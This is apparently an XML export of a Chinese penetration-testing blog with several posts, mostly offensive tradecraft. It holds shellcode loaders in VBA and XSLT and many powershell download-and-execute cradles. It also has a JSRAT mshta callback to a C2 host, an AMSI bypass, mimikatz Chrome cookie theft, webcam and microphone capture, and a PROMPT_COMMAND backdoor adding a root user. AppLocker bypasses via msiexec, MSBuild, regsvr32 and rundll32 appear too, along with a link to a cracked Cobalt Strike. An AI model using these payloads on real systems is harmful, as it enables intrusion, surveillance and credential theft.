Hyeyhafxp = Array(232,137,0,0,0,96,137,229,49,210,100,139,82,48,139,82,12,139,82,20, _\n' strCode += '139,114,40,15,183,74,38,49,255,49,192,172,60,97,124,2,44,32,193,207, _\n' strCode += '13,1,199,226,240,82,87,139,82,16,139,66,60,1,208,139,64,120,133,192, _\n' strCode += '116,74,1,208,80,139,72,24,139,88,32,1,211,227,60,73,139,52,139,1, _\n' strCode += '214,49,255,49,192,172,193,207,13,1,199,56,224,117,244,3,125,248,59,125, _\n' strCode += '36,117,226,88,139,88,36,1,211,102,139,12,75,139,88,28,1,211,139,4, _\n' strCode += '139,1,208,137,68,36,36,91,91,97,89,90,81,255,224,88,95,90,139,18, _\n' strCode += '235,134,93,106,1,141,133,185,0,0,0,80,104,49,139,111,135,255,213,187, _\n' strCode += '224,29,42,10,104,166,149,189,157,255,213,60,6,124,10,128,251,224,117,5, _\n' strCode += '187,71,19,114,111,106,0,83,255,213,99,97,108,99,0)\n' strCode += ' Xlbufvetp = VirtualAlloc(0, UBound(Hyeyhafxp), &amp;H1000, &amp;H40)\n' strCode += ' For Zolde = LBound(Hyeyhafxp) To UBound(Hyeyhafxp)\n' strCode += ' Wyzayxya = Hyeyhafxp(Zolde)\n' strCode += ' Lezhtplzi = RtlMoveMemory(Xlbufvetp + Zolde, Wyzayxya, 1)\n' strCode += ' Next Zolde\n' strCode += ' Lezhtplzi = CreateThread(0, 0, Xlbufvetp, 0, 0, 0)\n' strCode += 'End Sub\n' xlmodule.CodeModule.AddFromString(strCode); objExcel.Run("ExecShell"); objExcel.DisplayAlerts = false; objWorkbook.Close(false); ]]&gt;&lt;/script&gt;&lt;/registration&gt;&lt;/scriptlet&gt; 修改payload方法：1msfvenom --payload windows/meterpreter/reverse_http LHOST=192.168.56.103 LPORT=8080 --format vba &gt; msf.txt 选择要用的几行，简单处理一下：12345f = open('msf.txt')o = open('out.txt', 'w+')for line in f: o.write("strCode += '") o.write(line.strip("\n")+"\\n'\n")]]></content>
      <categories>
        <category>奇技淫巧</category>
      </categories>
      <tags>
        <tag>office</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hack With XSLT]]></title>
    <url>%2Farchives%2FHack_With_XSLT.html</url>
    <content type="text"><![CDATA[0x00 简介XSLT全称为拓展样式表转换语言，是一种用于将 XML 文档转换为 XHTML 文档或其他 XML 文档的语言。更多关于XSLT的教程可以参考W3school。关于XSLT的hack技巧之前已经有老师总结了WebShell系列(一)—XML，里面详细介绍了怎么通过xslt构造webshell，并且可以看的出，通过XSLT可以执行很多类型的脚本，前段时间@Casey Smith公开了一个Execute C# From XSLT 的POC，感觉很有趣，所以简单的研究了一下，也就有了此文。 0x01 POCCasey Smith分享的poc如下：calc.xslt12345678910111213141516171819&lt;xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:my="urn:MyModule"&gt; &lt;msxsl:script implements-prefix="my" language="C#"&gt; public void Exec() &#123; System.Diagnostics.Process.Start("Calc.exe"); &#125; &lt;/msxsl:script&gt; &lt;xsl:template match="data"&gt; &lt;result&gt; &lt;xsl:value-of select="my:Exec()" /&gt; &lt;/result&gt; &lt;/xsl:template&gt;&lt;/xsl:stylesheet&gt; 其中xsl:stylesheet用来定义样式表的根元素；version是其必须的属性，用来规定样式表的XSLT 版本；xmlns:xsl名称空间，值固定；要使用msxsl:script元素，由于其属于命名空间urn:schemas-microsoft-com:xslt，所以样式表必须包含命名空间声明；xmlns:my定义命名空间，名字随意，需要注意的是下面的implements-prefix的值要与其一致。 msxsl:script定义如下：1&lt;msxsl:script language = "language-name" implements-prefix = "prefix of user namespace"&gt; &lt;/msxsl:script&gt; 其中 msxsl 是绑定到命名空间 urn:schemas-microsoft-com:xslt 的前缀。language 属性不是强制属性，但如果指定该属性，其值必须是下列值之一：C#、VB、JScript、JavaScript、VisualBasic 或 CSharp。 如果未指定，则默认语言为 JScript。implements-prefix属性是必选项。 此属性用于声明命名空间并将其与脚本块关联。 xsl:template元素包含了当匹配指定节点时要应用的规则,match 属性用于把模板关联到某个 XML 元素,在这里关联了example.xml,如下：1&lt;?xml version="1.0"?&gt;&lt;data&gt;&lt;/data&gt; xsl:value-of 元素用于提取某个选定节点的值。在这里也就是执行我们的函数。 执行其POC，可以成功执行C#代码。 0x02 优化为了更方便使用，将powershell代码修改成可远程加载的代码，地址为：xslt_exec.ps1 使用此脚本可加载远程及本地XSL文件并执行其中的代码。使用方式很简单，以下为DEMO: 如果想远程加载执行可以这样：1powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Ridter/xslt_poc/master/xslt_exec.ps1'); xslt_exec -xslt_url https://raw.githubusercontent.com/Ridter/xslt_poc/master/calc.xslt" 0x03 Exec Shellcode既然能执行C#，那怎么执行ShellCode呢，其实很简单，参考Casey Smith给出的代码,修改代码如下:shellcode.xslt1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768&lt;xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:shellcode="urn:MyModule"&gt; &lt;msxsl:script implements-prefix="shellcode" language="C#"&gt; &lt;msxsl:using namespace="System.Runtime.InteropServices" /&gt; &lt;![CDATA[ private static UInt32 MEM_COMMIT = 0x1000; private static UInt32 PAGE_EXECUTE_READWRITE = 0x40; [DllImport("kernel32")] private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,UInt32 size, UInt32 flAllocationType, UInt32 flProtect); [DllImport("kernel32")] private static extern IntPtr CreateThread( UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId ); [DllImport("kernel32")] private static extern UInt32 WaitForSingleObject( IntPtr hHandle, UInt32 dwMilliseconds ); public void Exec() &#123; #msfvenom --payload windows/x64/exec CMD="calc" EXITFUNC=thread -f csharp byte[] shellcode = new new byte[272] &#123;0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,0x00 &#125;; UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE); Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length); IntPtr hThread = IntPtr.Zero; UInt32 threadId = 0; IntPtr pinfo = IntPtr.Zero; hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId); WaitForSingleObject(hThread, 0xFFFFFFFF); &#125;]]&gt; &lt;/msxsl:script&gt; &lt;xsl:template match="data"&gt; &lt;result&gt; &lt;xsl:value-of select="shellcode:Exec()" /&gt; &lt;/result&gt; &lt;/xsl:template&gt;&lt;/xsl:stylesheet&gt; shellcode可以通过msf来生成,具体生成方法在代码里已经给出，测试如下： 0x04 Exec JScript既然xslt可以执行多种脚本，当然也包括JScript，代码如下：12345678910111213141516171819&lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:user="http://mycompany.com/mynamespace"&gt; &lt;msxsl:script language="JScript" implements-prefix="user"&gt;&lt;![CDATA[ function test()&#123; var r = new ActiveXObject("WScript.Shell").Run("calc.exe"); &#125; ]]&gt; &lt;/msxsl:script&gt; &lt;xsl:template match="data"&gt; &lt;result&gt; &lt;xsl:value-of select="user:test()" /&gt; &lt;/result&gt; &lt;/xsl:template&gt;&lt;/xsl:stylesheet&gt; 远程加载如下：1powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Ridter/xslt_poc/master/xslt_exec.ps1'); xslt_exec -xslt_url https://raw.githubusercontent.com/Ridter/xslt_poc/master/js_calc.xslt" 之前Casey Smith分享过一个JS Dropper戳我。里面多了一个调用certuil.exe对文件进行base64加解密，这里当然也可以实现，具体代码就不贴了，地址在这。 0x05 Get Meterpreter说了这么多，有人可能会问怎么才能获得meterpreter，其实很简单，实现代码在这。首先msf开启监听：1234567use exploit/multi/script/web_deliveryset target 2set payload windows/meterpreter/reverse_tcpset lhost 192.168.100.101set lport 8889set uripath xsltexploit 然后修改meter.xslt，之后用ps来加载就可以了。 0x06 Other当然，除了powershell可以调用xslt,其他语言也可以，这里分享一个C#的，代码如下：1234567891011121314151617181920212223242526272829303132333435363738394041424344using System;using System.Collections.Generic;using System.IO;using System.Linq;using System.Text;using System.Threading.Tasks;using System.Xml.XPath;using System.Xml.Xsl;using System.Xml;namespace ApplyXSLTToXML&#123; class Program &#123; static void Main(string[] args) &#123; string XMLFilePath = @"https://evi1cg.github.io/scripts/example.xml"; string XSLTFilePath = @"https://evi1cg.github.io/scripts/calc.xslt"; try &#123; XsltSettings xslt_settings = new XsltSettings(false, true); xslt_settings.EnableScript = true; XslCompiledTransform xslt = new XslCompiledTransform(); XmlUrlResolver resolver = new XmlUrlResolver(); // Load documents xslt.Load(XSLTFilePath, xslt_settings, resolver); XPathDocument xmlPathDoc = new XPathDocument(XMLFilePath); XmlWriterSettings settings = new XmlWriterSettings(); settings.Indent = true; settings.OmitXmlDeclaration = true; XmlWriter writer = XmlWriter.Create("output.xml", settings); xslt.Transform(xmlPathDoc,writer); writer.Close(); &#125; catch (Exception e) &#123; Console.WriteLine("Error:"); Console.WriteLine(e.Message); &#125; &#125; &#125;&#125; 其他语言的，如果需要，还希望小伙伴们自己动手写写。 0x07 小结以上仅作为一个技术分享，代码均已在github分享，地址xslt_poc，希望对你有所启发。]]></content>
      <categories>
        <category>渗透案例</category>
      </categories>
      <tags>
        <tag>xslt</tag>
        <tag>shellcode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[cobaltstrike3.6 破解版]]></title>
    <url>%2Farchives%2FCobaltStrike_3_6_Cracked.html</url>
    <content type="text"><![CDATA[最近cobaltstrike更新到了3.6，所以下载了一下，并向小伙伴进行一下分享。运行截图： 破解以后的使用天数： 使用3.6你将拥有更强大的姿势，比如： 百度云： 链接: 戳我 密码: cjfx]]></content>
      <categories>
        <category>工具收集</category>
      </categories>
      <tags>
        <tag>cobaltstrike</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bypassing Applocker with msiexec]]></title>
    <url>%2Farchives%2FBypassing_Applocker_with_msiexec.html</url>
    <content type="text"><![CDATA[msf生成MSI：1msfvenom -f msi -p windows/exec CMD=calc.exe &gt; cacl.msi 命令行运行：1msiexec /quiet /i cacl.msi 将payload放在远程服务器上运行：1msiexec /q /i https://evi1cg.github.io/payloads/calc.png]]></content>
      <categories>
        <category>奇技淫巧</category>
      </categories>
      <tags>
        <tag>applocker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Commands 搜集(持续更新)]]></title>
    <url>%2Farchives%2FCommands.html</url>
    <content type="text"><![CDATA[LinuxLinux反弹shell后，方便的交互：1python -c 'import pty; pty.spawn("/bin/bash")' 无python时：1expect -c 'spawn bash;interact' 无wget nc等下载工具时下载文件1exec 5&lt;&gt;/dev/tcp/sec-lab.org/80 &amp;&amp;echo -e “GET /c.pl HTTP/1.0\n” &gt;&amp;5 &amp;&amp; cat&lt;&amp;5 &gt; c.pl 修改上传文件时间戳(掩盖入侵痕迹)1touch -r 老文件时间戳 新文件时间戳 利用BASH提权 这个要求管理员有su的习惯，我们可以通过它来添加一个id=0的用户$PROMPT_COMMAND 利用这个变量保存了在主提示符$PS1显示之前需要执行的命令导入:1export PROMPT_COMMAND=”/usr/sbin/useradd -o -u 0 hack &amp;&gt;/dev/null &amp;&amp; echo hacker:123456 | /usr/sbin/chpasswd &amp;&gt;/dev/null &amp;&amp; unset PROMPT_COMMAND” lsof 命令12345678lsof 1.txt 显示开启文件 abc.txt 的进程lsof -i :22 知道 22 端口现在运行什么程序lsof -c nsd 显示 nsd 进程现在打开的文件lsof -g gid 显示归属 gid 的进程情况lsof +d /usr/local/ 显示目录下被进程开启的文件lsof +D /usr/local/ 同上，但是会搜索目录下的目录，时间较长lsof -d 4 显示使用 fd 为4 的进程lsof -i [i] 用以显示符合条件的进程情况 SSH端口转发下面文章详细描述了3种方式转发http://www.cnblogs.com/david-zhang-index/archive/2012/08/18/2645943.html 图片马1Exiftool “-comment&lt;=raj.php” 1.png WindowsPowershell 相关获取无线密码：1powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Get-WLAN-Keys.ps1');Get-Wlan-Keys " 提权加账号1powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1');Invoke-MS16-032 -Application cmd.exe -commandline '/c net user evi1cg test123 /add'" 下载执行：1powershell -w hidden -c (new-object System.Net.WebClient).Downloadfile('http://b.hiphotos.baidu.com/image/pic/item/d009b3de9c82d15825ffd75c840a19d8bd3e42da.jpg','C:\\Users\Public\\test.jpg') &amp; start C:\\Users\\Public\\test.jpg 摄像头录像：1powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/xorrior/RandomPS-Scripts/master/MiniEye.ps1'); Capture-MiniEye -RecordTime 2 -Path $env:temp\hack.avi" 录音:1powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Exfiltration/Get-MicrophoneAudio.ps1');Get-MicrophoneAudio -Path $env:TEMP\secret.wav -Length 10 -Alias 'SECRET'" MSHTAVBSCRIPT EXEC1mshta vbscript:CreateObject("Wscript.Shell").Run("calc.exe",0,true)(window.close) JAVASCRIPT EXEC1mshta javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").run("calc.exe",0,true);try&#123;h.Send();b=h.ResponseText;eval(b);&#125;catch(e)&#123;new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im mshta.exe",0,true);&#125; JSRAT1mshta javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://192.168.2.101:9998/connect",false);try&#123;h.Send();b=h.ResponseText;eval(b);&#125;catch(e)&#123;new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im mshta.exe",0,true);&#125; Bypass AMSI:1PS C:\&gt; [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) use:1powershell.exe -ExecutionPolicy Bypass -noprofile [Ref].Assembly.GetType(''System.Management.Automation.AmsiUtils'').GetField(''amsiInitFailed'',''NonPublic,Static'').SetValue($null,$true);iex(New-Object Net.WebClient).DownloadString(''http://192.168.230.1/msfpayload.ps1'') Bypass AV12sqlite3.exe -cmd "select load_extension('1.txt','EP')"sqlite3.exe -cmd "select load_extension('\\192.168.1.101\share\1.txt','EP')" mimikatz获取vpn密码1mimikatz.exe privilege::debug token::elevate lsadump::sam lsadump::secrets exit 读取chrome cookies123mimikatz.exe privilege::debug log "dpapi::chrome /in:%localappdata%\google\chrome\USERDA~1\default\cookies /unprotect" exitmimikatz.exe privilege::debug log "dpapi::chrome /in:%localappdata%\google\chrome\USERDA~1\default\USERDA~1" exitmimikatz.exe privilege::debug log "dpapi::chrome /in:%localappdata%\google\chrome\USERDA~1\default\LOGIND~1" exit 提权常用// What system are we connected to?1systeminfo | findstr /B /C:"OS Name" /C:"OS Version" // Get the hostname and username (if available)12hostnameecho %username% // Get users12net usersnet user [username] // Networking stuff1ipconfig /all // Printer?1route print // ARP-arific1arp -A // Active network connections1netstat -ano // Firewall fun (Win XP SP2+ only)12netsh firewall show statenetsh firewall show config // Scheduled tasks1schtasks /query /fo LIST /v // Running processes to started services12tasklist /SVCnet start // Driver madness1DRIVERQUERY // WMIC fun (Win 7/8 – XP requires admin)1wmic /? //Use wmic_info script! // WMIC: check patch level1wmic qfe get Caption,Description,HotFixID,InstalledOn // Search pathces for given patch1wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB.." // AlwaysInstallElevated fun12reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevatedreg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated // Other commands to run to hopefully get what we need1234dir /s *pass* == *cred* == *vnc* == *.config*findstr /si password *.xml *.ini *.txtreg query HKLM /f password /t REG_SZ /sreg query HKCU /f password /t REG_SZ /s // Service permissions12sc querysc qc [service_name] // Accesschk stuff download link1234accesschk.exe /accepteula (always do this first!!!!!)accesschk.exe -ucqv [service_name] (requires sysinternals accesschk!)accesschk.exe -uwcqv "Authenticated Users" * (won't yield anything on Win 8)accesschk.exe -ucqv [service_name] // Find all weak folder permissions per drive.12accesschk.exe -uwdqs Users c:\accesschk.exe -uwdqs "Authenticated Users" c:\ // Find all weak file permissions per drive.12accesschk.exe -uwqs Users c:\*.*accesschk.exe -uwqs "Authenticated Users" c:\*.* // Binary planting1234sc config [service_name] binpath= "C:\nc.exe -nv [RHOST] [RPORT] -e C:\WINDOWS\System32\cmd.exe"sc config [service_name] obj= ".\LocalSystem" password= ""sc qc [service_name] (to verify!)net start [service_name] CMD1%ProgramData:~0,1%%ProgramData:~9,2% /c echo 命令行下载1certutil -urlcache -split -f example.com/file]]></content>
      <categories>
        <category>技术分享</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[MSSQL注入时通过Agent Job执行命令]]></title>
    <url>%2Farchives%2FMssql_Agent_Job_Exec.html</url>
    <content type="text"><![CDATA[1USE msdb; EXEC dbo.sp_add_job @job_name = N'test_powershell_job1' ; EXEC sp_add_jobstep @job_name = N'test_powershell_job1', @step_name = N'test_powershell_name1', @subsystem = N'PowerShell', @command = N'powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring(''http://IP_OR_HOSTNAME/file''))"', @retry_attempts = 1, @retry_interval = 5 ;EXEC dbo.sp_add_jobserver @job_name = N'test_powershell_job1'; EXEC dbo.sp_start_job N'test_powershell_job1';]]></content>
      <categories>
        <category>奇技淫巧</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[15版 osx10.11 El Capitan盒盖耗电解决方案]]></title>
    <url>%2Farchives%2Fosx10-11_weak_up_fix.html</url>
    <content type="text"><![CDATA[15版的macbook pro 更新El Capitan之后,每天电脑盒盖之后还耗费了挺多电，差不多一晚平均3%-5%，一直再想办法解决，也查看了好多方式，一直没有什么效果，经过多次尝试，终于解决了。妈妈再也不用担心电脑继续耗电了。所以现在分享一下这个方法。 首先可以查看一下是什么在唤醒电脑：1syslog | grep -i "wake reason" 我的电脑晚上老是被 RTC (Alarm) 唤醒，差不多两小时一次。该怎么解决呢？ 很简单。 首先重启电脑进入Recovery。再重启听到开机的那个声音的时候，按住comman+R 直到苹果的图标出现。 之后找到终端，然后输入以下命令：1csrutil disable 来禁止SIP，之后我们就可以修改一些系统的文件了。 之后重启电脑，打开终端：1sudo vim /System/Library/LaunchDaemons/com.apple.mDNSResponder.plist 找到&lt;string&gt;/usr/sbin/mDNSResponder&lt;/string&gt; 之后插入1&lt;string&gt;-NoMulticastAdvertisements&lt;/string&gt; 最终的样子是这样的:1234&lt;array&gt; &lt;string&gt;/usr/sbin/mDNSResponder&lt;/string&gt; &lt;string&gt;-NoMulticastAdvertisements&lt;/string&gt;&lt;/array&gt; 再次重启进入Recovery并打开终端开启SIP1csrutil enable 之后再重启就可以了。 再看看你的电脑的耗电吧。希望能帮到你！]]></content>
      <categories>
        <category>随便写写</category>
      </categories>
      <tags>
        <tag>osx</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bypassing Applocker with MSBuild.exe]]></title>
    <url>%2Farchives%2Fypassing_Applocker_with_MSBuild-exe.html</url>
    <content type="text"><![CDATA[前一篇文章总结了几种bypass Applocker的方法，最近又在 @subTee 博客学到了新的方法，所以在这里进行一下简单的分享。 首先介绍一下MSBuild，MSBuild 是 Microsoft 和 Visual Studio的生成系统。默认是存在于windows系统上的。那么怎么使用msbuild执行我们的代码呢？ 关于细节可以看这里： https://msdn.microsoft.com/en-us/library/dd722601.aspx @subTee 给出了几个POC。 Demo测试Hello World:12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003"&gt; &lt;!-- This inline task executes c# code. --&gt; &lt;!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe SimpleTasks.csproj --&gt; &lt;!-- Save This File And Execute The Above Command --&gt; &lt;!-- Author: Casey Smith, Twitter: @subTee --&gt; &lt;!-- License: BSD 3-Clause --&gt; &lt;Target Name="Hello"&gt; &lt;FragmentExample /&gt; &lt;ClassExample /&gt; &lt;/Target&gt; &lt;UsingTask TaskName="FragmentExample" TaskFactory="CodeTaskFactory" AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" &gt; &lt;ParameterGroup/&gt; &lt;Task&gt; &lt;Using Namespace="System" /&gt; &lt;Code Type="Fragment" Language="cs"&gt; &lt;![CDATA[ Console.WriteLine("Hello From a Code Fragment"); ]]&gt; &lt;/Code&gt; &lt;/Task&gt; &lt;/UsingTask&gt; &lt;UsingTask TaskName="ClassExample" TaskFactory="CodeTaskFactory" AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" &gt; &lt;Task&gt; &lt;!-- &lt;Reference Include="System.IO" /&gt; Example Include --&gt; &lt;Code Type="Class" Language="cs"&gt; &lt;![CDATA[ using System; using Microsoft.Build.Framework; using Microsoft.Build.Utilities; public class ClassExample : Task, ITask &#123; public override bool Execute() &#123; Console.WriteLine("Hello From a Class."); return true; &#125; &#125; ]]&gt; &lt;/Code&gt; &lt;/Task&gt; &lt;/UsingTask&gt;&lt;/Project&gt; 以上文件保存为123.csproj，然后使用msbuild执行。 Execute PowerShell Commands我们知道通过c#是可以执行powershell的，那么同样的，使用msbuild也可以。 pshell.xml123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109&lt;Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003"&gt; &lt;!-- This inline task executes c# code. --&gt; &lt;!-- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe pshell.xml --&gt; &lt;!-- Author: Casey Smith, Twitter: @subTee --&gt; &lt;!-- License: BSD 3-Clause --&gt; &lt;Target Name="Hello"&gt; &lt;FragmentExample /&gt; &lt;ClassExample /&gt; &lt;/Target&gt; &lt;UsingTask TaskName="FragmentExample" TaskFactory="CodeTaskFactory" AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" &gt; &lt;ParameterGroup/&gt; &lt;Task&gt; &lt;Using Namespace="System" /&gt; &lt;Using Namespace="System.IO" /&gt; &lt;Code Type="Fragment" Language="cs"&gt; &lt;![CDATA[ Console.WriteLine("Hello From Fragment"); ]]&gt; &lt;/Code&gt; &lt;/Task&gt; &lt;/UsingTask&gt; &lt;UsingTask TaskName="ClassExample" TaskFactory="CodeTaskFactory" AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" &gt; &lt;Task&gt; &lt;Reference Include="System.Management.Automation" /&gt; &lt;Code Type="Class" Language="cs"&gt; &lt;![CDATA[ using System; using System.IO; using System.Diagnostics; using System.Reflection; using System.Runtime.InteropServices; //Add For PowerShell Invocation using System.Collections.ObjectModel; using System.Management.Automation; using System.Management.Automation.Runspaces; using System.Text; using Microsoft.Build.Framework; using Microsoft.Build.Utilities; public class ClassExample : Task, ITask &#123; public override bool Execute() &#123; while(true) &#123; Console.Write("PS &gt;"); string x = Console.ReadLine(); try &#123; Console.WriteLine(RunPSCommand(x)); &#125; catch (Exception e) &#123; Console.WriteLine(e.Message); &#125; &#125; return true; &#125; //Based on Jared Atkinson's And Justin Warner's Work public static string RunPSCommand(string cmd) &#123; //Init stuff Runspace runspace = RunspaceFactory.CreateRunspace(); runspace.Open(); RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace); Pipeline pipeline = runspace.CreatePipeline(); //Add commands pipeline.Commands.AddScript(cmd); //Prep PS for string output and invoke pipeline.Commands.Add("Out-String"); Collection&lt;PSObject&gt; results = pipeline.Invoke(); runspace.Close(); //Convert records to strings StringBuilder stringBuilder = new StringBuilder(); foreach (PSObject obj in results) &#123; stringBuilder.Append(obj); &#125; return stringBuilder.ToString().Trim(); &#125; public static void RunPSFile(string script) &#123; PowerShell ps = PowerShell.Create(); ps.AddScript(script).Invoke(); &#125; &#125; ]]&gt; &lt;/Code&gt; &lt;/Task&gt; &lt;/UsingTask&gt;&lt;/Project&gt; 可以扩展的地方还有很多，想玩儿的可以在琢磨琢磨。]]></content>
      <categories>
        <category>奇技淫巧</category>
      </categories>
      <tags>
        <tag>bypass</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[AppLocker Bypass Techniques]]></title>
    <url>%2Farchives%2FAppLocker_Bypass_Techniques.html</url>
    <content type="text"><![CDATA[from:https://www.youtube.com/watch?v=z04NXAkhI4k 0x00 Command 和 Powershell 没被禁用，脚本被禁用 1、直接使用cmd powershell执行Powershell:1IEX (New-Object Net.WebClient).DownloadString('http://ip:port/') Command：1powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://ip:port/') 2、管道Powershell:1Get-Content script.ps1 | iex Command：1cmd.exe /K &lt; payload.bat 3、htapayload.hta12345678910&lt;HTML&gt; &lt;HEAD&gt; &lt;script language="VBScript"&gt; Set objShell = CreateObject("Wscript.Shell") objShell.Run "powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://ip:port/')"&lt;/script&gt;&lt;/HEAD&gt; &lt;BODY&gt; &lt;/BODY&gt; &lt;/HTML&gt; 4、Regsvr32.exe 1regsvr32 /u /n /s /i:payload.sct scrobj.dll 1regsvr32 /u /n /s /i:http://ip:port/payload.sct scrobj.dll payload.sct:123456789101112131415&lt;?XML version="1.0"?&gt;&lt;scriptlet&gt;&lt;registration progid="ShortJSRAT" classid="&#123;10001111-0000-0000-0000-0000FEEDACDC&#125;" &gt; &lt;!-- Learn from Casey Smith @subTee --&gt; &lt;script language="JScript"&gt; &lt;![CDATA[ rat="powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://ip:port/')"; new ActiveXObject("WScript.Shell").Run(rat,0,true); ]]&gt;&lt;/script&gt;&lt;/registration&gt;&lt;/scriptlet&gt; 5、rundll32payload:1rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://ip:port/');") 6、dll/cplpayload.dll1msfvenom -p windows/meterpreter/reverse_tcp -b '\x00\xff' lhost=192.168.127.132 lport=8888 -f dll -o payload.dll 运行：1rundll32 shell32.dll,Control_RunDLL payload.dll 将dll重命名为cpl，双击运行。 7、nishang 文件backdoor nishang client http://drops.wooyun.org/tips/8568 0x01 可执行目录 通过ps脚本扫描可写入的路径 下载地址：http://go.mssec.se/AppLockerBC 